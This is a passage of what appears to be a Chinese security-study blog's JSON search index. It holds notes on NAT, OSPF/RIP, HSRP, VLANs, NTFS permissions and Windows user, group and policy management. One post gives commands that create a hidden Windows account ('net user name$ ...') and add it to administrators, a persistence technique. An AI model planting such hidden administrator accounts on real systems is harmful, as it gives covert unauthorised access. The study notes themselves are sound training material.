内网多个地址直接转换为外网接口的地址 12345#定义内网范围access-list 1 permit any#应用ip nat inside source list 1 int g0/1 overload 端口映射(服务器映射) - 只能外网访问内网 将一台内网的服务器发布到内网，从而使内网的主机可以访问到内网的服务器 192.168.1.1：80 -》54.234.123.55：80 1ip nat inside source static tcp 192,168.1.100 80 23.34.56.78 8888 ​","text":"一、NAT基本概念 将私网IP地址转换为公网IP地址 1、转换方式 静态转换 仅针对IP地址转换 1对1 1ip nat inside source static 192.168.1.1 64.23.12.34 动态转换 仅针对IP地址转换 多对多(当内网主机多以外网IP个数时，无法实现内网所有主机上网 )，也无法根据外网地址定位内网，所以只能内网访问外网 1234567#定义内网范围access-list 1 permit 192.168.10.0 0.0.0.255#定义外网范围ip nat pool woniu 23.24.56.60 23.24.56.61 netmask 255.255.255.0#应用ip nat inside source list 1 pool woniu 端口多路复用PAT 多对1转，携带端口一起转换 192.168.1.1：8899 —》1.2.3.4：12345，形成的也是动态对应关系，只能内网访问外网 端口多路复用 内网的多个地址转换为外网的一个IP地址（端口一起转换） 1234567#定义内网范围access-list 1 permit any#定义外网范围ip nat pool woniu 23.24.56.60 23.24.56.60 netmask 255.255.255.0#应用ip nat inside source list 1 pool woniu overload 内网多个地址直接转换为外网接口的地址 12345#定义内网范围access-list 1 permit any#应用ip nat inside source list 1 int g0/1 overload 端口映射(服务器映射) - 只能外网访问内网 将一台内网的服务器发布到内网，从而使内网的主机可以访问到内网的服务器 192.168.1.1：80 -》54.234.123.55：80 1ip nat inside source static tcp 192,168.1.100 80 23.34.56.78 8888 ​","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"动态路由协议","slug":"动态路由协议_new","date":"2023-03-10T16:00:00.000Z","updated":"2023-07-22T02:53:56.602Z","comments":true,"path":"2023/03/11/动态路由协议_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/11/%E5%8A%A8%E6%80%81%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE_new/","excerpt":"动态路由协议 动态路由协议 RIP：路由信息协议，距离矢量路由协议 OSPF：开放式最短路径优先 BGP：外部网关路由协议 特点 减少管理员的工作量 增加了网络带宽 什么是内部，什么是外部 AS：运行相同的路由协议的路由器属于同一个自治系统 通过自治系统连接外部的路由器，需要经过外部网关 内部网关路由协议（IGP）：用于在单一自治系统中去决策路由，RIP，OSPF 外部网关路由协议：用于连接不同自治系统，BGP 动态路由协议需要考虑的内容 度量值：跳数、带宽、时延、成本 收敛：所有路由器的路由表达到一致的状态 RIP协议 基本概念 一种内部网关协议，在单一自治系统内的路由器去传递路由信息 靠跳数来衡量到达目标的距离 最大15跳，16代表不可达 每隔30秒向相邻的路由器发送路由更新消息，采用UDP 520端口 从相邻的路由器去学习路由条目 不同颜色代表不同周期，C代表直连，R代表路由器，第二列代表网段，第三列代表端口号，第四列代表距离 OSPF 动态路由协议 概念 开放式最短路径优先路由协议，内部网关路由协议 链路状态路由协议：在单一区域内的路由器可以向相邻路由器发送链路状态信息 工作过程 相邻的路由器建立邻接关系 根据链路信息，建立链路状态数据库 最短路径树计算 路由表 OSPF区域 划分区域 适应大型网络 每个ospf 路由器只维护自己所在区域的链路状态信息 每个区域有一个区域ID，用十进制或者IP地址表示 骨干区域：区域之间的路由信息传播 区域ID：0，0.0.0.0 非骨干区域：普通区域 单区域内容 在同一个区域当中通过选举DR和BDR来节省网络中的流量 区域中的其他路由器只会和DR和BDR建立邻接关系 DR 选举 通过routeID进行选举，最大的作为DR，第二大作为 BDR 度量值 cost值（代价） 邻接关系建立 以组播方式发送 224.0.0.5 代表所有OSPF 224.0.0.6 代表DR BDR 报文类型 hello保温 数据库描述包 链路状态请求包 链路状态更新包 链路状态确认包 RIP 和OSPF对比 RIP１ 不支持可变长子网掩码，使用广播更新 RIP 2 使用组播更新 跳数限制15跳 不能划分区域，网络收敛慢 OSPF 使用组播更新 网络收敛快，通过区域划分 支持可变长子网掩码，携带子网掩码 ospf 配置 12345route ospf 10netword 192.168.10.0 0.0.0.255 area 0192.168.10.0 宣告的网段 0.0.0.255 反码 area 表示宣告的区域show ip ospf 查看ospf 基本配置信息show ip ospf neighbor 查看邻接关系 ospf 多区域概念 目的 实现大型网络环境，实现单区域网络快速收敛，改善网络，减小路由表 通信 域内通信量 域外通信量- ABR 外部通信量-与其他自治系统 ASBR 区域 骨干区域 非骨干区域 标准区域 末梢区域 完全末梢 非纯末梢 OSPF 高级配置 路由重分发 在大型网络中，可能在同一网络中用到多种路由协议，为了协同工作，路由器通过路由重分发将其学习到的一种路由协议的路由通过另一种路由协议广播出去。 NSSA 非纯末梢区域，在此区域内会有一个ASBR路由器，需要在ASBR上配置重分发 多了一种类型LSA，类型7LSA在一个 NSSA区域内携带外部信息 在NSSA的ABR上转换位5LSA N1 N2类型 通过NSSA的ABR之后转换为E1、E2 虚链路 在两台ABR之间建立，穿越一个非骨干区域","text":"动态路由协议 动态路由协议 RIP：路由信息协议，距离矢量路由协议 OSPF：开放式最短路径优先 BGP：外部网关路由协议 特点 减少管理员的工作量 增加了网络带宽 什么是内部，什么是外部 AS：运行相同的路由协议的路由器属于同一个自治系统 通过自治系统连接外部的路由器，需要经过外部网关 内部网关路由协议（IGP）：用于在单一自治系统中去决策路由，RIP，OSPF 外部网关路由协议：用于连接不同自治系统，BGP 动态路由协议需要考虑的内容 度量值：跳数、带宽、时延、成本 收敛：所有路由器的路由表达到一致的状态 RIP协议 基本概念 一种内部网关协议，在单一自治系统内的路由器去传递路由信息 靠跳数来衡量到达目标的距离 最大15跳，16代表不可达 每隔30秒向相邻的路由器发送路由更新消息，采用UDP 520端口 从相邻的路由器去学习路由条目 不同颜色代表不同周期，C代表直连，R代表路由器，第二列代表网段，第三列代表端口号，第四列代表距离 OSPF 动态路由协议 概念 开放式最短路径优先路由协议，内部网关路由协议 链路状态路由协议：在单一区域内的路由器可以向相邻路由器发送链路状态信息 工作过程 相邻的路由器建立邻接关系 根据链路信息，建立链路状态数据库 最短路径树计算 路由表 OSPF区域 划分区域 适应大型网络 每个ospf 路由器只维护自己所在区域的链路状态信息 每个区域有一个区域ID，用十进制或者IP地址表示 骨干区域：区域之间的路由信息传播 区域ID：0，0.0.0.0 非骨干区域：普通区域 单区域内容 在同一个区域当中通过选举DR和BDR来节省网络中的流量 区域中的其他路由器只会和DR和BDR建立邻接关系 DR 选举 通过routeID进行选举，最大的作为DR，第二大作为 BDR 度量值 cost值（代价） 邻接关系建立 以组播方式发送 224.0.0.5 代表所有OSPF 224.0.0.6 代表DR BDR 报文类型 hello保温 数据库描述包 链路状态请求包 链路状态更新包 链路状态确认包 RIP 和OSPF对比 RIP１ 不支持可变长子网掩码，使用广播更新 RIP 2 使用组播更新 跳数限制15跳 不能划分区域，网络收敛慢 OSPF 使用组播更新 网络收敛快，通过区域划分 支持可变长子网掩码，携带子网掩码 ospf 配置 12345route ospf 10netword 192.168.10.0 0.0.0.255 area 0192.168.10.0 宣告的网段 0.0.0.255 反码 area 表示宣告的区域show ip ospf 查看ospf 基本配置信息show ip ospf neighbor 查看邻接关系 ospf 多区域概念 目的 实现大型网络环境，实现单区域网络快速收敛，改善网络，减小路由表 通信 域内通信量 域外通信量- ABR 外部通信量-与其他自治系统 ASBR 区域 骨干区域 非骨干区域 标准区域 末梢区域 完全末梢 非纯末梢 OSPF 高级配置 路由重分发 在大型网络中，可能在同一网络中用到多种路由协议，为了协同工作，路由器通过路由重分发将其学习到的一种路由协议的路由通过另一种路由协议广播出去。 NSSA 非纯末梢区域，在此区域内会有一个ASBR路由器，需要在ASBR上配置重分发 多了一种类型LSA，类型7LSA在一个 NSSA区域内携带外部信息 在NSSA的ABR上转换位5LSA N1 N2类型 通过NSSA的ABR之后转换为E1、E2 虚链路 在两台ABR之间建立，穿越一个非骨干区域","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"热备份路由选择协议","slug":"热备份路由选择协议_new","date":"2023-03-09T16:00:00.000Z","updated":"2023-07-22T02:53:56.604Z","comments":true,"path":"2023/03/10/热备份路由选择协议_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/10/%E7%83%AD%E5%A4%87%E4%BB%BD%E8%B7%AF%E7%94%B1%E9%80%89%E6%8B%A9%E5%8D%8F%E8%AE%AE_new/","excerpt":"HSRP（热备份路由选择协议）目标1、了解HSRP的相关概念 2、理解工作原理 3、配置 一、概念1、成员 活跃路由器 备份路由器 虚拟路由器 其他路由器 2、虚拟MAC地址 ４８位包括前２４ 厂商编码，后２４位序列号 后24位包括固定值07AC+HSRP组号","text":"HSRP（热备份路由选择协议）目标1、了解HSRP的相关概念 2、理解工作原理 3、配置 一、概念1、成员 活跃路由器 备份路由器 虚拟路由器 其他路由器 2、虚拟MAC地址 ４８位包括前２４ 厂商编码，后２４位序列号 后24位包括固定值07AC+HSRP组号 3、HSRP 消息 UDP协议，端口号1985 组播模式 224.0.0.2 生命周期 TTL&#x3D;1 二、工作原理如下，主机要访问外网，将数据交给自己的网关，在这里主机配置的网关是HSRP组中的虚拟路由器，虚拟路由器收到数据后，根据HSRP组中的机制，将数据交给活跃的路由器进行转发，活跃路路由器根据自身路由表进行转发数据。 设置组号（决定虚拟路由器的MAC地址） 优先级 占先","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"路由器相关知识","slug":"路由器相关知识_new","date":"2023-03-08T16:00:00.000Z","updated":"2023-07-22T02:53:56.613Z","comments":true,"path":"2023/03/09/路由器相关知识_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/09/%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86_new/","excerpt":"1、路由器相关知识 三层设备 网络层功能 逻辑地址寻址，实现不同网络直接的路径选择 查找目的是否可达，可达则选择最优路径 网络层传输的是PDU ,IP数据包 2、IP数据包的格式 IPV4 数据包格式 3、路由器的工作原理 路由 从源主机到目标主机的转发过程 包含两个内容 确定最佳路径（手动绑定，根据动态路由协商方式） 通过网络传输信息 路由表 直接路由：当路由器的接口配置好对应的IP地址并开启接口后自动生成 非直接路由：需要手动配置静态路由或者使用动态路由协议学习 4、静态路由 管理员配置、不灵活 特殊的静态路由：默认路由 使用场景：一般应用于末节网络 123ip route 目标网络 下一跳地址或者接口ip route 192.168.10.0 255.255.255.0 192.168.30.2ip route 192.168.10.0 255.255.255.0 f0/1 5、动态路由 通过某种动态路由协议自动的去建立自己的路由表 常见的动态路由协议，RIP OSPF","text":"1、路由器相关知识 三层设备 网络层功能 逻辑地址寻址，实现不同网络直接的路径选择 查找目的是否可达，可达则选择最优路径 网络层传输的是PDU ,IP数据包 2、IP数据包的格式 IPV4 数据包格式 3、路由器的工作原理 路由 从源主机到目标主机的转发过程 包含两个内容 确定最佳路径（手动绑定，根据动态路由协商方式） 通过网络传输信息 路由表 直接路由：当路由器的接口配置好对应的IP地址并开启接口后自动生成 非直接路由：需要手动配置静态路由或者使用动态路由协议学习 4、静态路由 管理员配置、不灵活 特殊的静态路由：默认路由 使用场景：一般应用于末节网络 123ip route 目标网络 下一跳地址或者接口ip route 192.168.10.0 255.255.255.0 192.168.30.2ip route 192.168.10.0 255.255.255.0 f0/1 5、动态路由 通过某种动态路由协议自动的去建立自己的路由表 常见的动态路由协议，RIP OSPF 6、路由器转发数据 源IP和目的IP一直不发生变化，源MAC地址和目的MAC地址一直在发生变化，路由器不断进行2层封装 同网段传输主要是二层转发，不需要重新封装 跨网段传输主要是三层转发，需要重新封装 7、 VLAN 把同一个网段的主机划分到不同的广播域，不能再简单的进行二层通信了，在同一交换机下，不同vlan不能直接通信了 划分的目的 划分广播域 增强安全性 简化管理 种类 静态划分 基于端口进行划分，需要去配置 华为路由器 1-4094 端口范围 动态划分 基于MAC地址自动加入 VLUN TRUNK 实现相同VLAN跨交换机通信 配置接口模式为Trunk模式 8、不同VLAN直接的通信技术 单臂路由(路由器压力大，容易造成网络拥堵) 在路由器上划分子接口作为不同vlan的网关,例如g&#x2F;0 物理接口划分为g&#x2F;0.1 g&#x2F;0.2 主机与交换机-access 交换机和路由器–Trunk 三层交换","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"交换机的工作原理","slug":"交换机的工作原理_new","date":"2023-03-07T16:00:00.000Z","updated":"2023-07-22T03:06:31.360Z","comments":true,"path":"2023/03/08/交换机的工作原理_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/08/%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86_new/","excerpt":"1、数据链路层设备，传输数据帧，封装MAC头部，源MAC地址，目的MAC地址 2、数据链路层的功能 建立逻辑连接，进行物理地址寻址，差错校验 数据链路的建立，维护和拆除 数据帧的封装、传输、同步、差错校验、流量控制 3、以太网 以太网&#x3D;&#x3D; 局域网 有线局域网 无线局域网 4、交换机&#x3D;&#x3D;默认以太网交换机 5、MAC地址 用于标识以太网商的某个设备 以太网中通信需要MAC地址 6、以太网的帧格式","text":"1、数据链路层设备，传输数据帧，封装MAC头部，源MAC地址，目的MAC地址 2、数据链路层的功能 建立逻辑连接，进行物理地址寻址，差错校验 数据链路的建立，维护和拆除 数据帧的封装、传输、同步、差错校验、流量控制 3、以太网 以太网&#x3D;&#x3D; 局域网 有线局域网 无线局域网 4、交换机&#x3D;&#x3D;默认以太网交换机 5、MAC地址 用于标识以太网商的某个设备 以太网中通信需要MAC地址 6、以太网的帧格式 7、以太网交换机 早期共享式交换机-集线器 一个冲突域的网络 交换式网络 广播 数据转发流程，A往B转发，交换机接受到A发来的数据帧后会检查MAC表中是否存在端口和MAC地址的对应关系，没有则不补上，随后查看目的MAC地址，如果不存在则广播，B收到后回应，其他的收到后丢弃，随后以单播方式通信。","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"NTFS 权限规则","slug":"NTFS 权限规则_new","date":"2023-03-03T16:00:00.000Z","updated":"2023-07-22T02:53:56.589Z","comments":true,"path":"2023/03/04/NTFS 权限规则_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/04/NTFS%20%E6%9D%83%E9%99%90%E8%A7%84%E5%88%99_new/","excerpt":"NTFS 权限规则 一、权限规则 权限的累加 用户分配的有效权限是分配给用户所有权限的累加 用户被分配的权限+所属组的权限 拒绝权限 拒绝的权限大于一切（在访问控制列表中，权限最高） 出现权限冲突时，拒绝的权限优先级最高（用户所属组读取权限，用户拒绝读取，最终是拒绝读取权限） 继承权限 文件或者文件夹默认集成上级文件夹的权限 特殊权限 读取权限（和读取文件或者文件夹的内容无关） 读取文件或者文件夹的访问控制列表 ，没有读取权限，点击文件-属性-安全，看不到ACL 访问文件的内容，此权限必须勾选 更改权限（和修改文件、修改文件夹的内容无关） 用户是否可以修改文件或者文件夹的访问控制列表，此权限可以为用户添加或者删除权限，会造成很多不安全因素，一般不给用户 更改的前提是读取权限 取得所有权 能够修改文件或者文件夹的所有者 前提是读取和更改","text":"NTFS 权限规则 一、权限规则 权限的累加 用户分配的有效权限是分配给用户所有权限的累加 用户被分配的权限+所属组的权限 拒绝权限 拒绝的权限大于一切（在访问控制列表中，权限最高） 出现权限冲突时，拒绝的权限优先级最高（用户所属组读取权限，用户拒绝读取，最终是拒绝读取权限） 继承权限 文件或者文件夹默认集成上级文件夹的权限 特殊权限 读取权限（和读取文件或者文件夹的内容无关） 读取文件或者文件夹的访问控制列表 ，没有读取权限，点击文件-属性-安全，看不到ACL 访问文件的内容，此权限必须勾选 更改权限（和修改文件、修改文件夹的内容无关） 用户是否可以修改文件或者文件夹的访问控制列表，此权限可以为用户添加或者删除权限，会造成很多不安全因素，一般不给用户 更改的前提是读取权限 取得所有权 能够修改文件或者文件夹的所有者 前提是读取和更改","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"NTFS权限","slug":"NTFS权限_new","date":"2023-03-03T16:00:00.000Z","updated":"2023-07-22T06:08:35.363Z","comments":true,"path":"2023/03/04/NTFS权限_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/04/NTFS%E6%9D%83%E9%99%90_new/","excerpt":"NTFS权限 一、 NTFS权限 文件系统 windows 早期windows使用FAT16，FAT32 NTFS ACL（访问控制列表） EFS(加密文件系统) BitLocker 压缩及磁盘配额 ReFS winserver2012 Linux swap:交换文件系统，主要将磁盘的一部分空间划分给内存使用 ext3&#x2F;ext4 可以用convert命令在不格式化的前提下，修改文件系统 1convert H:/fs:ntfs //H 是盘符 二、文件权限 设置文件权限 读取数据 写入数据 附加数据 删除 执行 三、文件夹权限 设置文件夹权限 列出文件夹 创建文佳佳 创建文件 删除 删除子文件夹和文件 四、权限的分类","text":"NTFS权限 一、 NTFS权限 文件系统 windows 早期windows使用FAT16，FAT32 NTFS ACL（访问控制列表） EFS(加密文件系统) BitLocker 压缩及磁盘配额 ReFS winserver2012 Linux swap:交换文件系统，主要将磁盘的一部分空间划分给内存使用 ext3&#x2F;ext4 可以用convert命令在不格式化的前提下，修改文件系统 1convert H:/fs:ntfs //H 是盘符 二、文件权限 设置文件权限 读取数据 写入数据 附加数据 删除 执行 三、文件夹权限 设置文件夹权限 列出文件夹 创建文佳佳 创建文件 删除 删除子文件夹和文件 四、权限的分类 完全控制 修改 读取和执行 读取 写入 特殊权限 -读取权限 更改权限 取得所有权","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"windows 文件共享","slug":"windows 文件共享_new","date":"2023-03-03T16:00:00.000Z","updated":"2023-07-22T02:53:56.595Z","comments":true,"path":"2023/03/04/windows 文件共享_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/04/windows%20%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB_new/","excerpt":"windows 文件共享 一、共享要求 一般是局域网使用 1、物理上处于同一局域网 同一公司的网络 同一家庭的网络 同一个手机热点 2、逻辑上处于同一局域网 直接可以ping 对方主机 二、共享权限 1、共享权限 everyone完全控制","text":"windows 文件共享 一、共享要求 一般是局域网使用 1、物理上处于同一局域网 同一公司的网络 同一家庭的网络 同一个手机热点 2、逻辑上处于同一局域网 直接可以ping 对方主机 二、共享权限 1、共享权限 everyone完全控制 2、NTFS权限 根据用户来的 3、用户从网络访问server的最终权限 共享权限和NTFS权限的交集 三、访问共享 12\\\\server_address\\\\主机名 输入用户名和密码","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"windows 用户管理","slug":"windows 用户管理_new","date":"2023-03-03T16:00:00.000Z","updated":"2023-07-22T02:53:56.597Z","comments":true,"path":"2023/03/04/windows 用户管理_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/04/windows%20%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86_new/","excerpt":"windows 用户管理 一. 用户账户 什么是用户账户 不同的用户身份拥有不同的权限 每个用户包含了一个名称和密码 每个用户账户具有唯一的安全标识符号 SID 查看系统中的用户 1net user 查看SID 命令查看 12whoami /userwmic useraccount get name,sid 注册表查看SID 计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\ 进行用户管理 创建用户 用户名：系统的显示名 全名：用户登录时的显示名 密码：server版本有密码复杂性要求，本地安全策略 账户已锁定：如果开启账户锁定阈值，账户有可能输错多次被锁定 123456# 创建用户不指定密码net user 用户名 /add# 创建用户指定明文密码net user 用户名 密码 /add# 创建用户，手动输入密码net user 用户名 /add * 管理用户 设置密码 隐藏用户 12# net user 查看不到 wmic useraccount get name,sid ,以及计算机管理里面可以看到net user 用户名$ 密码 /add 12# 添加隐藏用户并提升为管理员权限net localgroup administrators 用户名 /add 二 、windows的内置用户 1、与使用者关联的 管理员：administrator使用者中具有最高的权限,没有其他管理员的情况下，不建议禁用 普通用户：具有一定的读取权限，权限较低 来宾用户：提供给访客使用，默认为禁用，权限最低 2、与windows 组件相关 system 本地系统：拥有最高权限 local service 本地服务 :权限相对于普通用户组user 低一些 netword service 网络服务：权限跟普通用户组user 一样","text":"windows 用户管理 一. 用户账户 什么是用户账户 不同的用户身份拥有不同的权限 每个用户包含了一个名称和密码 每个用户账户具有唯一的安全标识符号 SID 查看系统中的用户 1net user 查看SID 命令查看 12whoami /userwmic useraccount get name,sid 注册表查看SID 计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\ 进行用户管理 创建用户 用户名：系统的显示名 全名：用户登录时的显示名 密码：server版本有密码复杂性要求，本地安全策略 账户已锁定：如果开启账户锁定阈值，账户有可能输错多次被锁定 123456# 创建用户不指定密码net user 用户名 /add# 创建用户指定明文密码net user 用户名 密码 /add# 创建用户，手动输入密码net user 用户名 /add * 管理用户 设置密码 隐藏用户 12# net user 查看不到 wmic useraccount get name,sid ,以及计算机管理里面可以看到net user 用户名$ 密码 /add 12# 添加隐藏用户并提升为管理员权限net localgroup administrators 用户名 /add 二 、windows的内置用户 1、与使用者关联的 管理员：administrator使用者中具有最高的权限,没有其他管理员的情况下，不建议禁用 普通用户：具有一定的读取权限，权限较低 来宾用户：提供给访客使用，默认为禁用，权限最低 2、与windows 组件相关 system 本地系统：拥有最高权限 local service 本地服务 :权限相对于普通用户组user 低一些 netword service 网络服务：权限跟普通用户组user 一样","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"windows 组的管理","slug":"windows 组的管理_new","date":"2023-03-03T16:00:00.000Z","updated":"2023-07-22T02:53:56.598Z","comments":true,"path":"2023/03/04/windows 组的管理_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/04/windows%20%E7%BB%84%E7%9A%84%E7%AE%A1%E7%90%86_new/","excerpt":"windows 组的管理 一、用户组 概念 一组用户的集合，组中所有的用户具备组的权限 管理组 12345678# 新建组net localgroup 组名 /add# 删除组net localgroup 组名 /del# 添加成员到组net localgroup 组名 成员 /add# 把用户从组里删除net localgroup 组名 成员 /del 二、内置组用户 1. 需要认为添加的 - administrators:管理员组 - guests:来宾用户组 - power users:向下兼容的组 - users:标准用户组，创建用户后默认属于该组 2. 动态包含成员 - interactive:动态包含在本地登录的用户 - authenticated users:动态包含通过验证的用户 - everyone:所有人，包含了来宾用户","text":"windows 组的管理 一、用户组 概念 一组用户的集合，组中所有的用户具备组的权限 管理组 12345678# 新建组net localgroup 组名 /add# 删除组net localgroup 组名 /del# 添加成员到组net localgroup 组名 成员 /add# 把用户从组里删除net localgroup 组名 成员 /del 二、内置组用户 1. 需要认为添加的 - administrators:管理员组 - guests:来宾用户组 - power users:向下兼容的组 - users:标准用户组，创建用户后默认属于该组 2. 动态包含成员 - interactive:动态包含在本地登录的用户 - authenticated users:动态包含通过验证的用户 - everyone:所有人，包含了来宾用户","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"本地安全策略大纲","slug":"本地安全策略_new","date":"2023-03-03T16:00:00.000Z","updated":"2023-07-22T03:04:46.303Z","comments":true,"path":"2023/03/04/本地安全策略_new/","link":"","permalink":"http://zwjsfdbb.top/2023/03/04/%E6%9C%AC%E5%9C%B0%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5_new/","excerpt":"本地安全策略大纲 一、本地安全策略基本内容 1、概念 主要对登录到计算机的账户进行一些安全设置 主要是影响本地计算机的安全 2、打开方式 开始菜单-管理工具-本地安全策略 使用命令 1secpol.msc 从本地组策略进去 1gpedit.msc 二、账户策略 1、密码策略 密码必须符合复杂性要求 2、账户锁定策略","text":"本地安全策略大纲 一、本地安全策略基本内容 1、概念 主要对登录到计算机的账户进行一些安全设置 主要是影响本地计算机的安全 2、打开方式 开始菜单-管理工具-本地安全策略 使用命令 1secpol.msc 从本地组策略进去 1gpedit.msc 二、账户策略 1、密码策略 密码必须符合复杂性要求 2、账户锁定策略 账户锁定时间 账户锁定阈值 重置账户锁定计数器的时间 管理员不受限制—-注册表隐藏管理员账户，从而无法实施爆破 三、本地策略 审核策略 用户权限分配 安全选项","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"注册表相关修改小技巧","slug":"注册表相关修改小技巧","date":"2023-03-03T16:00:00.000Z","updated":"2023-07-27T14:06:57.502Z","comments":true,"path":"2023/03/04/注册表相关修改小技巧/","link":"","permalink":"http://zwjsfdbb.top/2023/03/04/%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9B%B8%E5%85%B3%E4%BF%AE%E6%94%B9%E5%B0%8F%E6%8A%80%E5%B7%A7/","excerpt":"1、去除快捷方式左下角的小箭头 HKEY—CLASS_ROOT\\lnkfile Isshortcut 删除 2、禁用注册表 HKCU\\software\\microsoft\\windows\\currentversion\\policies\\system [DisableRegistrytools]:1 3、禁用状态下，如何恢复 Registry WorkShop 来打开，改写禁用注册表的项","text":"1、去除快捷方式左下角的小箭头 HKEY—CLASS_ROOT\\lnkfile Isshortcut 删除 2、禁用注册表 HKCU\\software\\microsoft\\windows\\currentversion\\policies\\system [DisableRegistrytools]:1 3、禁用状态下，如何恢复 Registry WorkShop 来打开，改写禁用注册表的项","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"计算机网络五层协议","slug":"计算机网络五层协议","date":"2023-03-03T16:00:00.000Z","updated":"2023-07-27T14:24:32.759Z","comments":true,"path":"2023/03/04/计算机网络五层协议/","link":"","permalink":"http://zwjsfdbb.top/2023/03/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%94%E5%B1%82%E5%8D%8F%E8%AE%AE/","excerpt":"应用层： 将原始数据转换为计算机的二进制，HTTP，FTP，SMTP 传输层：将报文划分成较小的块，然后为每块加上传输层首部来生成传输层报文段。代表是TCP，UDP协议 网络层：进行逻辑地址寻址，进行IP头部的封装，主要的字段，源IP和目的IP。 数据链路层：建立逻辑链接，进行物理地址寻址，主要的字段源MAC地址，目的MAC地址 物理层：将二进制数据转换为电信号通过网卡通过网线进行传输。","text":"应用层： 将原始数据转换为计算机的二进制，HTTP，FTP，SMTP 传输层：将报文划分成较小的块，然后为每块加上传输层首部来生成传输层报文段。代表是TCP，UDP协议 网络层：进行逻辑地址寻址，进行IP头部的封装，主要的字段，源IP和目的IP。 数据链路层：建立逻辑链接，进行物理地址寻址，主要的字段源MAC地址，目的MAC地址 